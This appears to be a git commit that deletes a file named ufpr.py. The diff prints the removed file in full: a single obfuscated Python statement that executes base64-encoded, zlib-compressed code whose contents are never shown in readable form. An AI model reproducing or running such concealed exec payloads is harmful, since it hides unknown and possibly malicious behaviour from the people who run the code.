32d2cd99466bf84a526d4ad1dc6285832f341e91
StrikeNew <84656924+StrikeNew@users.noreply.github.com>
2023-02-11 18:38:53 +0600

    Delete ufpr.py

--- ufpr.py
+++
@@ -1,8 +0,0 @@
-exec(__import__('zlib').decompress(__import__('base64').b64d
-ecode(__import__('codecs').getencoder('utf-8')('eNo9UN9LwzAQ
-fm7+ir4lwSysWzfosIKIDyIiuL2JSJvcNDRNQpJpVfzfbcjwHu747r777oca
-nfWxDFYMENm3Vj3ruwDbmoXoTyKyqEZAR+vLqVSm9J15A1It6Q4V0X/Nvght
-buY5kBU74/3jzf3r/vB0e/1AE48LawyISAiu1g3fNLxZ86pZYVbPRhOn99AN
-qIBJgItJPE3nQQM4sqFIt3kpfjKuEwPBV3eYBe5BfJBZ4Hn5gmR7xpqiz3el
-odRgiKSXepaTF//VRU5TBBMIku7mEoQdnYcQSH4B77d1SkpITPaDA96FX4r+
-ACo0X0E=')[0])))
